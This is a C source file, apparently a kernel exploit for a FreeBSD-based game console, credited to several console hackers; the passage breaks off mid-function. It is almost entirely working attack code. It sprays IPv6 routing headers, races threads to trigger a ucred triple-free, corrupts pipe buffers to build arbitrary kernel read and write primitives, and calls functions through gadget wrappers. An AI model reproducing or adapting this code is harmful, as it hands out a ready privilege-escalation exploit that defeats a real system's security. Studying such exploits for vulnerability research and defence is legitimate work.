// Credits : TheFloW, egycnq, cheburek3000, Gezine

#include "types.h"

#define LIBKERNEL_HANDLE   0x2001
#define LIBC_HANDLE        0x2
#define GADGET_OFFSET      0x31aa9

#define AF_UNIX            1
#define AF_INET            2
#define AF_INET6           28
#define SOCK_STREAM        1
#define SOCK_DGRAM         2
#define IPPROTO_IPV6       41

#define SO_SNDBUF          0x1001
#define SO_SNDLOWAT        0x1003
#define SOL_SOCKET         0xffff

#define IPV6_RTHDR         51
#define IPV6_RTHDR_TYPE_0  0

#define RTP_PRIO_REALTIME  2
#define RTP_SET            1

#define UIO_READ           0
#define UIO_WRITE          1
#define UIO_SYSSPACE       1

#define CPU_LEVEL_WHICH    3
#define CPU_WHICH_TID      1

#define IOV_SIZE           0x10
#define CPU_SET_SIZE       0x10
#define PIPEBUF_SIZE       0x18
#define MSG_HDR_SIZE       0x30

#define UCRED_SIZE         0x168
#define RTHDR_TAG          0x13370000
#define PAGE_SIZE          0x4000

#define UIO_IOV_NUM        0x14
#define MSG_IOV_NUM        0x17

#define IPV6_SOCK_NUM      80
#define IOV_THREAD_NUM     4
#define UIO_THREAD_NUM     4

#define COMMAND_UIO_READ   0
#define COMMAND_UIO_WRITE  1

#define MAIN_CORE          0
#define ERR_TRIPLE_FREE    2
#define ERR_LEAK_KQUEUE    3

#define NULL_FD_COUNT           0x14
#define TRIPLEFREE_ATTEMPTS     8
#define MAX_ROUNDS_TRIPLET      500

#define KQEX_THREAD_NUM         3
#define KQUEUEEX_CALLS          0xFFFF0000ULL
#define KQUEUEEX_MAIN_CALLS     0xFFEDULL
#define KQUEUEEX_INVALID_PTR    0x800000000000ULL

#define KERNEL_PID         0
#define SYSCORE_AUTHID     0x4800000000000007ULL

#define FIOSETOWN          0x8004667CULL

#define F_SETFL            4
#define O_NONBLOCK         4

#define PROT_RWX           7
#define MAP_SHARED         1
#define O_RDONLY           0
#define SEEK_SET           0
#define SEEK_END           2

#define FILEDESCENT_SIZE       0x30
#define KQ_FDP_OFFSET          0xA8
#define PIPE_SIGIO_OFFSET      0xD8
#define IN6P_OUTPUTOPTS_OFFSET 0x120
#define IP6PO_RHI_RTHDR_OFFSET 0x70
#define ROOTVNODE_OFFSET       0x8
#define FDT_OFILES_OFFSET      0x8
#define P_PID_OFFSET           0xBC

#define PUT8(b,o,v)  (((u8*)(b))[(o)]=(u8)(v))
#define PUT16(b,o,v) (*(u16*)((u8*)(b)+(o))=(u16)(v))
#define PUT32(b,o,v) (*(u32*)((u8*)(b)+(o))=(u32)(v))
#define PUT64(b,o,v) (*(u64*)((u8*)(b)+(o))=(u64)(v))
#define GET8(b,o)    (((u8*)(b))[(o)])
#define GET32(b,o)   (*(u32*)((u8*)(b)+(o)))
#define GET64(b,o)   (*(u64*)((u8*)(b)+(o)))

typedef s32  (*dlsym_t)            (s32 handle, const char *sym, void **out);
typedef s32  (*socket_t)           (s32 domain, s32 type, s32 proto);
typedef s32  (*socketpair_t)       (s32 domain, s32 type, s32 proto, s32 *sv);
typedef s32  (*dup_t)              (s32 fd);
typedef s32  (*close_t)            (s32 fd);
typedef s32  (*setuid_t)           (u32 uid);
typedef s32  (*getpid_t)           (void);
typedef s32  (*kqueue_t)           (void);
typedef s32  (*setsockopt_t)       (s32 fd, s32 lvl, s32 opt, const void *val, u32 len);
typedef s32  (*getsockopt_t)       (s32 fd, s32 lvl, s32 opt, void *val, u32 *len);
typedef s32  (*recvmsg_t)          (s32 s, void *msg, s32 flags);
typedef s64  (*read_t)             (s32 fd, void *buf, u64 n);
typedef s64  (*readv_t)            (s32 fd, void *iov, s32 iovcnt);
typedef s64  (*write_t)            (s32 fd, const void *buf, u64 n);
typedef s64  (*writev_t)           (s32 fd, const void *iov, s32 iovcnt);
typedef s32  (*ioctl_t)            (s32 fd, u64 req, u64 arg);
typedef s32  (*pipe_t)             (s32 *fds);
typedef s32  (*fcntl_t)            (s32 fd, s32 cmd, s64 arg);
typedef s32  (*sched_yield_t)      (void);
typedef u32  (*sleep_t)            (u32 seconds);
typedef s32  (*cpuset_setaffinity_t)(s32 lvl, s32 which, s64 id, u64 setsz, void *mask);
typedef s32  (*rtprio_thread_t)    (s32 fn, s32 lwpid, u64 rtp);
typedef s32  (*kqueueex_t)         (const char *name, s32 flags);
typedef s64  (*sendto_t)           (s32 fd, const void *buf, u64 len, s32 flags,
                                    const void *to, u32 tolen);
typedef s32  (*pthread_create_t)   (u64 *thr, void *attr, void *(*fn)(void*), void *arg);
typedef s32  (*pthread_join_t)          (u64 thr, void **ret);
typedef s32  (*pthread_mutex_init_t)    (u64 *mtx, const void *attr);
typedef s32  (*pthread_mutex_lock_t)    (u64 *mtx);
typedef s32  (*pthread_mutex_unlock_t)  (u64 *mtx);
typedef s32  (*pthread_cond_init_t)     (u64 *cond, const void *attr);
typedef s32  (*pthread_cond_wait_t)     (u64 *cond, u64 *mtx);
typedef s32  (*pthread_cond_broadcast_t)(u64 *cond);
typedef void *(*calloc_t)          (u64 nmemb, u64 size);
typedef void  (*free_t)            (void *ptr);
typedef s32   (*sceKernelJitCreateSharedMemory_t)(u32 flags, u64 size, u32 prot, s32 *fd_out);
typedef void *(*mmap_t)            (void *addr, u64 len, s32 prot, s32 flags, s32 fd, u64 off);
typedef s32   (*open_t)            (const char *path, s32 flags);
typedef s64   (*lseek_t)           (s32 fd, s64 offset, s32 whence);

typedef struct {
    s32  total;
    s32  started;
    s32  finished;
    s32  command;
    u64  mutex;
    u64  cond;
    void *gadget;
    pthread_mutex_lock_t     fn_lock;
    pthread_mutex_unlock_t   fn_unlock;
    pthread_cond_wait_t      fn_wait;
    pthread_cond_broadcast_t fn_broadcast;
} worker_state_t;

typedef struct {
    
    void *gadget;

    
    socket_t              fn_socket;
    socketpair_t          fn_socketpair;
    dup_t                 fn_dup;
    close_t               fn_close;
    setuid_t              fn_setuid;
    getpid_t              fn_getpid;
    kqueue_t              fn_kqueue;
    setsockopt_t          fn_setsockopt;
    getsockopt_t          fn_getsockopt;
    recvmsg_t             fn_recvmsg;
    read_t                fn_read;
    readv_t               fn_readv;
    write_t               fn_write;
    writev_t              fn_writev;
    ioctl_t               fn_ioctl;
    pipe_t                fn_pipe;
    fcntl_t               fn_fcntl;
    sched_yield_t         fn_sched_yield;
    sleep_t               fn_sleep;
    cpuset_setaffinity_t  fn_cpuset_setaffinity;
    rtprio_thread_t       fn_rtprio_thread;
    kqueueex_t            fn_kqueueex;
    sendto_t              fn_sendto;
    pthread_create_t      fn_pthread_create;
    pthread_join_t           fn_pthread_join;
    pthread_mutex_init_t     fn_mutex_init;
    pthread_mutex_lock_t     fn_mutex_lock;
    pthread_mutex_unlock_t   fn_mutex_unlock;
    pthread_cond_init_t      fn_cond_init;
    pthread_cond_wait_t      fn_cond_wait;
    pthread_cond_broadcast_t fn_cond_broadcast;
    calloc_t              fn_calloc;
    free_t                fn_free;
    sceKernelJitCreateSharedMemory_t fn_jit_create;
    mmap_t                fn_mmap;
    open_t                fn_open;
    lseek_t               fn_lseek;

    
    s32  log_sock;
    u8   log_addr[16];

    
    s32  ipv6_socks[IPV6_SOCK_NUM];
    s32  uio_ss[2];
    s32  iov_ss[2];

    
    s32  master_pipe[2];
    s32  victim_pipe[2];

    
    u64  iov_threads[IOV_THREAD_NUM];
    u64  uio_threads[UIO_THREAD_NUM];
    worker_state_t iov_state;
    worker_state_t uio_state;

    
    u8  *spray_rthdr;       
    u8  *leak_rthdr;        
    u8  *msg_hdr;           
    u8  *msg_iov;           
    u8  *uio_iov_read;      
    u8  *uio_iov_write;     
    u8  *dummy_buf;         
    u8  *tmp;               

    s32  spray_rthdr_len;
    u32  leak_rthdr_len;

    
    u64  kl_lock;
    u64  kq_fdp;
    u64  curproc;
    u64  allproc;

    u64  fdt_ofiles;

    
    s32  twins[2];
    s32  triplets[3];
    s32  null_fds[NULL_FD_COUNT];
    s32  free_fd_idx;

    u64  kqex_threads[KQEX_THREAD_NUM];
    void *kqex_args;
    volatile u64 kqex_counter;
    volatile s32 kqex_done;
    volatile s32 kqex_go;

} exploit_ctx_t;

typedef struct {
    exploit_ctx_t  *ctx;
    worker_state_t *state;
} thread_arg_t;

typedef struct {
    exploit_ctx_t *ctx;
    s32            core;
} kqex_arg_t;


__attribute__((naked))
static u64 eboot_wrap(void *gadget, void *fn,
                         u64 a1, u64 a2, u64 a3,
                         u64 a4, u64 a5, u64 a6)
{
    __asm__ (
        "push rbx\n\t"
        "push r12\n\t"
        "mov rbx, rsi\n\t"
        "mov r12, rdi\n\t"
        "mov rdi, rdx\n\t"
        "mov rsi, rcx\n\t"
        "mov rdx, r8\n\t"
        "mov rcx, r9\n\t"
        "mov r8,  [rsp + 24]\n\t"
        "mov r9,  [rsp + 32]\n\t"
        "xor eax, eax\n\t"
        "call r12\n\t"
        "pop r12\n\t"
        "pop rbx\n\t"
        "ret"
    );
}

#define CALL(ctx, fn, a1, a2, a3, a4, a5, a6) \
    eboot_wrap((ctx)->gadget, (void*)(ctx)->fn, \
               (u64)(a1),(u64)(a2),(u64)(a3),(u64)(a4),(u64)(a5),(u64)(a6))

__attribute__((naked))
static u64 syscall_wrap(void *gadget, void *syscall_stub,
                        u64 num, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5)
{
    __asm__ (
        "push rbx\n\t"
        "push r12\n\t"
        "mov rbx, rsi\n\t"       
        "mov r12, rdi\n\t"       
        "mov rax, rdx\n\t"       
        "mov rdi, rcx\n\t"       
        "mov rsi, r8\n\t"        
        "mov rdx, r9\n\t"        
        "mov rcx, [rsp + 24]\n\t"
        "mov r8,  [rsp + 32]\n\t"
        "call r12\n\t"           
        "pop r12\n\t"
        "pop rbx\n\t"
        "ret"
    );
}

#define SYSCALL_RAW(ctx, num, a1, a2, a3, a4, a5) \
    syscall_wrap((ctx)->gadget, \
                 (void*)((u64)(ctx)->fn_getpid + 7), \
                 (u64)(num),(u64)(a1),(u64)(a2),(u64)(a3),(u64)(a4),(u64)(a5))

#define SYS_THR_NEW  0x1C7ULL
#define SYS_THR_EXIT 0x1AFULL

typedef struct {
    u64 start_func; 
    u64 arg;        
    u64 stack_base; 
    u64 stack_size; 
    u64 tls_base;   
    u64 tls_size;   
    u64 child_tid;  
    u64 parent_tid; 
    s32 flags;      
    s32 pad;        
    u64 rtp;        
    u64 spare[3];   
} thr_param_t;      

#define THR_STACK_SIZE 0x8000ULL
#define THR_TLS_SIZE   0x40ULL

static void resolve(void *gadget, dlsym_t dlsym, s32 handle,
                    const char *name, void **out)
{
    eboot_wrap(gadget, (void*)dlsym,
               (u64)handle, (u64)name, (u64)out, 0, 0, 0);
}

static u64 str_len(const char *s) { u64 n=0; while(s[n]) n++; return n; }

static u32 parse_ipv4(const char *s)
{
    u32 result = 0;
    u32 octet  = 0;
    s32 shift  = 0;
    for (int i = 0; ; i++) {
        char c = s[i];
        if (c >= '0' && c <= '9') {
            octet = octet * 10 + (u32)(c - '0');
        } else if (c == '.' || c == '\0') {
            result |= (octet & 0xFF) << shift;
            shift  += 8;
            octet   = 0;
            if (c == '\0') break;
        }
    }
    return result;
}

static void log_send(exploit_ctx_t *ctx, const char *msg)
{
    if (ctx->log_sock <= 0 || !ctx->fn_sendto) return;
    eboot_wrap(ctx->gadget, (void*)ctx->fn_sendto,
               (u64)ctx->log_sock, (u64)msg, str_len(msg), 0,
               (u64)ctx->log_addr, 16);
}
#define LOG(ctx, msg) log_send((ctx), (msg))

static void log_hex32(exploit_ctx_t *ctx, const char *msg, u32 v)
{
    const char *h = "0123456789abcdef";
    char buf[64];
    u64 i = 0, ml = str_len(msg);
    while (i < ml && i < 48) { buf[i] = msg[i]; i++; }
    buf[i++]='0'; buf[i++]='x';
    for (int s=28; s>=0; s-=4) buf[i++]=h[(v>>s)&0xF];
    buf[i++]='\n'; buf[i]='\0';
    log_send(ctx, buf);
}

static void log_hex64(exploit_ctx_t *ctx, const char *msg, u64 v)
{
    const char *h = "0123456789abcdef";
    char buf[80];
    u64 i = 0, ml = str_len(msg);
    while (i < ml && i < 48) { buf[i] = msg[i]; i++; }
    buf[i++]='0'; buf[i++]='x';
    for (int s=60; s>=0; s-=4) buf[i++]=h[(v>>s)&0xF];
    buf[i++]='\n'; buf[i]='\0';
    log_send(ctx, buf);
}


#define WS_LOCK(ws)      eboot_wrap((ws)->gadget,(void*)(ws)->fn_lock,     (u64)&(ws)->mutex,0,0,0,0,0)
#define WS_UNLOCK(ws)    eboot_wrap((ws)->gadget,(void*)(ws)->fn_unlock,   (u64)&(ws)->mutex,0,0,0,0,0)
#define WS_WAIT(ws)      eboot_wrap((ws)->gadget,(void*)(ws)->fn_wait,     (u64)&(ws)->cond,(u64)&(ws)->mutex,0,0,0,0)
#define WS_BROADCAST(ws) eboot_wrap((ws)->gadget,(void*)(ws)->fn_broadcast,(u64)&(ws)->cond,0,0,0,0,0)

static void worker_init(worker_state_t *ws, s32 total, exploit_ctx_t *ctx)
{
    ws->total    = total;
    ws->started  = 0;
    ws->finished = 0;
    ws->command  = -1;
    ws->gadget   = ctx->gadget;
    ws->fn_lock      = ctx->fn_mutex_lock;
    ws->fn_unlock    = ctx->fn_mutex_unlock;
    ws->fn_wait      = ctx->fn_cond_wait;
    ws->fn_broadcast = ctx->fn_cond_broadcast;
    eboot_wrap(ctx->gadget, (void*)ctx->fn_mutex_init,
               (u64)&ws->mutex, 0, 0, 0, 0, 0);
    eboot_wrap(ctx->gadget, (void*)ctx->fn_cond_init,
               (u64)&ws->cond, 0, 0, 0, 0, 0);
}

static void worker_signal_work(worker_state_t *ws, s32 cmd)
{
    WS_LOCK(ws);
    ws->started  = 0;
    ws->finished = 0;
    ws->command  = cmd;
    WS_BROADCAST(ws);
    while (ws->started < ws->total)
        WS_WAIT(ws);
    WS_UNLOCK(ws);
}

static s32 worker_wait_for_work(worker_state_t *ws)
{
    WS_LOCK(ws);
    while (ws->command == -1 || ws->finished != 0)
        WS_WAIT(ws);
    ws->started++;
    if (ws->started == ws->total)
        WS_BROADCAST(ws);
    s32 cmd = ws->command;
    WS_UNLOCK(ws);
    return cmd;
}

static void worker_signal_finished(worker_state_t *ws)
{
    WS_LOCK(ws);
    ws->finished++;
    if (ws->finished == ws->total)
        WS_BROADCAST(ws);
    WS_UNLOCK(ws);
}

static void worker_wait_for_finished(worker_state_t *ws)
{
    WS_LOCK(ws);
    while (ws->finished < ws->total)
        WS_WAIT(ws);
    ws->command = -1;
    WS_UNLOCK(ws);
}

static void cpu_set_affinity(exploit_ctx_t *ctx, s32 core)
{
    u8 mask[CPU_SET_SIZE];
    for (int i = 0; i < CPU_SET_SIZE; i++) mask[i] = 0;
    *(u16*)mask = (u16)(1 << core);
    CALL(ctx, fn_cpuset_setaffinity,
         CPU_LEVEL_WHICH, CPU_WHICH_TID,
         (s64)-1, (u64)CPU_SET_SIZE, (u64)mask, 0);
}

static void rtprio_thread(exploit_ctx_t *ctx, s32 value)
{
    u8 rtp[4];
    PUT16(rtp, 0x00, RTP_PRIO_REALTIME);
    PUT16(rtp, 0x02, value);
    CALL(ctx, fn_rtprio_thread, RTP_SET, 0, (u64)rtp, 0, 0, 0);
}

static s32 build_rthdr(u8 *buf, s32 size)
{
    s32 len = ((size >> 3) - 1) & ~1;
    PUT8(buf, 0x00, 0);               
    PUT8(buf, 0x01, len);             
    PUT8(buf, 0x02, IPV6_RTHDR_TYPE_0);
    PUT8(buf, 0x03, len >> 1);        
    return (len + 1) << 3;
}

static s32 get_rthdr(exploit_ctx_t *ctx, s32 s, u8 *buf, u32 *len)
{
    return (s32)CALL(ctx, fn_getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
                     (u64)buf, (u64)len, 0);
}

static s32 set_rthdr(exploit_ctx_t *ctx, s32 s, u8 *buf, s32 len)
{
    return (s32)CALL(ctx, fn_setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
                     (u64)buf, (u32)len, 0);
}

static s32 free_rthdr(exploit_ctx_t *ctx, s32 s)
{
    return (s32)CALL(ctx, fn_setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0);
}

static void corrupt_pipebuf(exploit_ctx_t *ctx,
                             s32 cnt, s32 in, s32 out, s32 size, u64 buffer)
{
    u8 pb[PIPEBUF_SIZE];
    PUT32(pb, 0x00, cnt);
    PUT32(pb, 0x04, in);
    PUT32(pb, 0x08, out);
    PUT32(pb, 0x0C, size);
    PUT64(pb, 0x10, buffer);
    CALL(ctx, fn_write, ctx->master_pipe[1], (u64)pb, PIPEBUF_SIZE, 0, 0, 0);
    CALL(ctx, fn_read,  ctx->master_pipe[0], (u64)pb, PIPEBUF_SIZE, 0, 0, 0);
}

static void kread(exploit_ctx_t *ctx, u64 src, void *dest, u64 n)
{
    corrupt_pipebuf(ctx, (s32)n, 0, 0, PAGE_SIZE, src);
    CALL(ctx, fn_read, ctx->victim_pipe[0], (u64)dest, n, 0, 0, 0);
}

static void kwrite(exploit_ctx_t *ctx, u64 dest, const void *src, u64 n)
{
    corrupt_pipebuf(ctx, 0, 0, 0, PAGE_SIZE, dest);
    CALL(ctx, fn_write, ctx->victim_pipe[1], (u64)src, n, 0, 0, 0);
}

static u64 kread64(exploit_ctx_t *ctx, u64 addr)
{
    u64 v = 0; kread(ctx, addr, &v, 8); return v;
}

static u32 kread32(exploit_ctx_t *ctx, u64 addr)
{
    u32 v = 0; kread(ctx, addr, &v, 4); return v;
}

static u16 kread16(exploit_ctx_t *ctx, u64 addr)
{
    u16 v = 0; kread(ctx, addr, &v, 2); return v;
}

static u8 kread8(exploit_ctx_t *ctx, u64 addr)
{
    u8 v = 0; kread(ctx, addr, &v, 1); return v;
}

static void kwrite64(exploit_ctx_t *ctx, u64 addr, u64 val)
{
    kwrite(ctx, addr, &val, 8);
}

static void kwrite32(exploit_ctx_t *ctx, u64 addr, u32 val)
{
    kwrite(ctx, addr, &val, 4);
}

static void kwrite16(exploit_ctx_t *ctx, u64 addr, u16 val)
{
    kwrite(ctx, addr, &val, 2);
}


static void kwrite8(exploit_ctx_t *ctx, u64 addr, u8 val)
{
    kwrite(ctx, addr, &val, 1);
}

static u64 fget(exploit_ctx_t *ctx, s32 fd)
{
    return kread64(ctx, ctx->fdt_ofiles + (u64)fd * FILEDESCENT_SIZE);
}

static void fhold(exploit_ctx_t *ctx, u64 fp)
{
    kwrite32(ctx, fp + 0x28, kread32(ctx, fp + 0x28) + 1);
}

static void *iov_thread_fn(void *arg)
{
    thread_arg_t   *ta  = (thread_arg_t *)arg;
    exploit_ctx_t  *ctx = ta->ctx;
    worker_state_t *ws  = ta->state;

    cpu_set_affinity(ctx, MAIN_CORE);
    rtprio_thread(ctx, 256);

    while (1) {
        worker_wait_for_work(ws);
        CALL(ctx, fn_recvmsg, ctx->iov_ss[0], (u64)ctx->msg_hdr, 0, 0, 0, 0);
        worker_signal_finished(ws);
    }
    return 0;
}

static void *uio_thread_fn(void *arg)
{
    thread_arg_t   *ta  = (thread_arg_t *)arg;
    exploit_ctx_t  *ctx = ta->ctx;
    worker_state_t *ws  = ta->state;

    cpu_set_affinity(ctx, MAIN_CORE);
    rtprio_thread(ctx, 256);

    while (1) {
        s32 cmd = worker_wait_for_work(ws);
        if (cmd == COMMAND_UIO_READ)
            CALL(ctx, fn_writev, ctx->uio_ss[1], (u64)ctx->uio_iov_read,
                 UIO_IOV_NUM, 0, 0, 0);
        else
            CALL(ctx, fn_readv, ctx->uio_ss[0], (u64)ctx->uio_iov_write,
                 UIO_IOV_NUM, 0, 0, 0);
        worker_signal_finished(ws);
    }
    return 0;
}


static void log_progress(exploit_ctx_t *ctx, u32 pct, u32 eta_min, u64 count)
{
    if (ctx->log_sock <= 0 || !ctx->fn_sendto) return;
    if (pct >= 100) return;
    const char *h = "0123456789abcdef";
    char buf[64] = {0};
    char *p = buf;
    const char *s = "kqex: cnt=0x";
    while (*s) *p++ = *s++;
    for (int sh = 60; sh >= 0; sh -= 4) *p++ = h[(count >> sh) & 0xF];
    *p++ = ' ';
    if (pct >= 100) *p++ = '0' + pct/100;
    if (pct >= 10)  *p++ = '0' + (pct/10)%10;
    *p++ = '0' + pct%10;
    *p++ = '%'; *p++ = ' ';
    s = "eta=";
    while (*s) *p++ = *s++;
    u32 v = eta_min;
    if (v >= 100) *p++ = '0' + v/100;
    if (v >= 10)  *p++ = '0' + (v/10)%10;
    *p++ = '0' + v%10;
    s = "min\n";
    while (*s) *p++ = *s++;
    CALL(ctx, fn_sendto, ctx->log_sock, (u64)buf, (u32)(p - buf), 0,
         (u64)ctx->log_addr, sizeof(ctx->log_addr));
}

static void  kqex_thread_fn(void *arg)
{
    kqex_arg_t    *ta  = (kqex_arg_t*)arg;
    exploit_ctx_t *ctx = ta->ctx;

    u8 mask[CPU_SET_SIZE] = {0};
    ((u16*)mask)[0] = (u16)(1 << ta->core);
    CALL(ctx, fn_cpuset_setaffinity,
         CPU_LEVEL_WHICH, CPU_WHICH_TID, (u64)-1LL, CPU_SET_SIZE, (u64)mask, 0);
    rtprio_thread(ctx, 256);

    while (!ctx->kqex_go) {}

    while (1) {
        u64 n = __sync_fetch_and_add((u64*)&ctx->kqex_counter, 1);
        if (n >= KQUEUEEX_CALLS) break;
        CALL(ctx, fn_kqueueex, KQUEUEEX_INVALID_PTR, 0, 0, 0, 0, 0);
    }
    __sync_fetch_and_add((s32*)&ctx->kqex_done, 1);
    
    while (ctx->kqex_go) {}
    SYSCALL_RAW(ctx, SYS_THR_EXIT, 0, 0, 0, 0, 0);
}

static s32 find_twins(exploit_ctx_t *ctx)
{
    for (int attempts = 0; attempts < 5000; attempts++) {

        for (int i = 0; i < IPV6_SOCK_NUM; i++) {
            PUT32(ctx->spray_rthdr, 0x04, RTHDR_TAG | i);
            s32 sr = set_rthdr(ctx, ctx->ipv6_socks[i],
                               ctx->spray_rthdr, ctx->spray_rthdr_len);
            if (i == 0 && attempts == 0)
                log_hex32(ctx, "find_twins: set_rthdr[0] ret=", (u32)sr);
        }

        for (int i = 0; i < IPV6_SOCK_NUM; i++) {
            ctx->leak_rthdr_len = 8;
            s32 gr = get_rthdr(ctx, ctx->ipv6_socks[i],
                               ctx->leak_rthdr, &ctx->leak_rthdr_len);
            if (i == 0 && attempts == 0) {
                log_hex32(ctx, "find_twins: get_rthdr[0] ret=", (u32)gr);
                log_hex32(ctx, "find_twins: leak_rthdr_len=", ctx->leak_rthdr_len);
            }
            u32 val = GET32(ctx->leak_rthdr, 0x04);
            s32 j   = (s32)(val & 0xFFFF);

            if (i == 0 && attempts % 1000 == 0)
                log_hex32(ctx, "find_twins: sock[0] val=", val);

            if ((val & 0xFFFF0000) == (u32)RTHDR_TAG && i != j) {
                log_hex32(ctx, "find_twins: found attempt=", (u32)attempts);
                log_hex32(ctx, "find_twins: twins[0] idx=", (u32)i);
                log_hex32(ctx, "find_twins: twins[0] fd=",  (u32)ctx->ipv6_socks[i]);
                log_hex32(ctx, "find_twins: twins[1] idx=", (u32)j);
                log_hex32(ctx, "find_twins: twins[1] fd=",  (u32)ctx->ipv6_socks[j]);
                ctx->twins[0] = i;
                ctx->twins[1] = j;
                return 1;
            }
        }
    }
    LOG(ctx, "find_twins: failed after 5000 attempts\n");
    return 0;
}

static s32 find_triplet(exploit_ctx_t *ctx, s32 master, s32 other)
{
    for (int attempts = 0; attempts < 5000; attempts++) {
        for (int i = 0; i < IPV6_SOCK_NUM; i++) {
            if (i == master || i == other) continue;
            PUT32(ctx->spray_rthdr, 0x04, RTHDR_TAG | i);
            set_rthdr(ctx, ctx->ipv6_socks[i],
                      ctx->spray_rthdr, ctx->spray_rthdr_len);
        }
        ctx->leak_rthdr_len = 8;   
        get_rthdr(ctx, ctx->ipv6_socks[master],
                  ctx->leak_rthdr, &ctx->leak_rthdr_len);
        u32 val = GET32(ctx->leak_rthdr, 0x04);
        s32 j   = (s32)(val & 0xFFFF);
        if ((val & 0xFFFF0000) == (u32)RTHDR_TAG && j != master && j != other) {
            return j;
        }
    }
    return -1;
}

static void free_one_fd(exploit_ctx_t *ctx)
{
    CALL(ctx, fn_close, ctx->null_fds[ctx->free_fd_idx], 0, 0, 0, 0, 0);
    ctx->null_fds[ctx->free_fd_idx] = -1;
    ctx->free_fd_idx++;
}

static s32 attempt_race(exploit_ctx_t *ctx)
{
    for (int i = 0; i < IPV6_SOCK_NUM; i++)
        free_rthdr(ctx, ctx->ipv6_socks[i]);

    free_one_fd(ctx);

    for (int i = 0; i < 32; i++) {
        worker_signal_work(&ctx->iov_state, 0);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
        CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
        worker_wait_for_finished(&ctx->iov_state);
        CALL(ctx, fn_read,  ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
    }

    free_one_fd(ctx);

    if (!find_twins(ctx)) {
        LOG(ctx, "attempt_race: twins not found\n");
        return 0;
    }

    free_rthdr(ctx, ctx->ipv6_socks[ctx->twins[1]]);
    CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
    CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);

    s32 reclaimed = 0;
    for (int r = 0; r < MAX_ROUNDS_TRIPLET; r++) {
        worker_signal_work(&ctx->iov_state, 0);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
        ctx->leak_rthdr_len = 8;
        get_rthdr(ctx, ctx->ipv6_socks[ctx->twins[0]],
                  ctx->leak_rthdr, &ctx->leak_rthdr_len);
        if (GET32(ctx->leak_rthdr, 0x00) == 1) { reclaimed = 1; break; }
        CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
        worker_wait_for_finished(&ctx->iov_state);
        CALL(ctx, fn_read,  ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
    }
    if (!reclaimed) {
        LOG(ctx, "attempt_race: not reclaimed\n");
        return 0;
    }

    ctx->triplets[0] = ctx->twins[0];

    free_one_fd(ctx);
    CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);

    s32 ret = find_triplet(ctx, ctx->triplets[0], -1);
    if (ret < 0) { LOG(ctx, "attempt_race: triplets[1] not found\n"); return 0; }
    ctx->triplets[1] = ret;

    CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);

    ret = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
    if (ret < 0) {
        worker_wait_for_finished(&ctx->iov_state);
        CALL(ctx, fn_read, ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
        LOG(ctx, "attempt_race: triplets[2] not found\n");
        return 0;
    }
    ctx->triplets[2] = ret;

    worker_wait_for_finished(&ctx->iov_state);
    CALL(ctx, fn_read, ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
    return 1;
}

static s32 trigger_ucred_triple_free(exploit_ctx_t *ctx)
{
    LOG(ctx, "tctf: enter\n");

    ctx->spray_rthdr_len = build_rthdr(ctx->spray_rthdr, UCRED_SIZE);

    PUT64(ctx->msg_hdr, 0x10, (u64)ctx->msg_iov);
    PUT64(ctx->msg_hdr, 0x18, MSG_IOV_NUM);

    PUT64(ctx->uio_iov_read,  0x00, (u64)ctx->dummy_buf);
    PUT64(ctx->uio_iov_write, 0x00, (u64)ctx->dummy_buf);

    CALL(ctx, fn_socketpair, AF_UNIX, SOCK_STREAM, 0, (u64)ctx->uio_ss, 0, 0);
    CALL(ctx, fn_socketpair, AF_UNIX, SOCK_STREAM, 0, (u64)ctx->iov_ss, 0, 0);

    thread_arg_t *iov_args = (thread_arg_t*)
        CALL(ctx, fn_calloc, IOV_THREAD_NUM, sizeof(thread_arg_t), 0, 0, 0, 0);
    thread_arg_t *uio_args = (thread_arg_t*)
        CALL(ctx, fn_calloc, UIO_THREAD_NUM, sizeof(thread_arg_t), 0, 0, 0, 0);

    worker_init(&ctx->iov_state, IOV_THREAD_NUM, ctx);
    worker_init(&ctx->uio_state, UIO_THREAD_NUM, ctx);

    for (int i = 0; i < IOV_THREAD_NUM; i++) {
        iov_args[i].ctx   = ctx;
        iov_args[i].state = &ctx->iov_state;
        eboot_wrap(ctx->gadget, (void*)ctx->fn_pthread_create,
                   (u64)&ctx->iov_threads[i], 0,
                   (u64)iov_thread_fn, (u64)&iov_args[i], 0, 0);
    }
    for (int i = 0; i < UIO_THREAD_NUM; i++) {
        uio_args[i].ctx   = ctx;
        uio_args[i].state = &ctx->uio_state;
        eboot_wrap(ctx->gadget, (void*)ctx->fn_pthread_create,
                   (u64)&ctx->uio_threads[i], 0,
                   (u64)uio_thread_fn, (u64)&uio_args[i], 0, 0);
    }

    for (int i = 0; i < IPV6_SOCK_NUM; i++)
        free_rthdr(ctx, ctx->ipv6_socks[i]);

    PUT64(ctx->msg_iov, 0x00, 1);
    PUT64(ctx->msg_iov, 0x08, 1);
    
    ctx->kqex_args = (void*)CALL(ctx, fn_calloc,
                                 KQEX_THREAD_NUM, sizeof(kqex_arg_t), 0, 0, 0, 0);
    kqex_arg_t *kqex_args = (kqex_arg_t*)ctx->kqex_args;

    s32 kqex_cores[KQEX_THREAD_NUM] = {1, 2, 3};
    ctx->kqex_counter = 0;
    ctx->kqex_done    = 0;
    ctx->kqex_go      = 0;

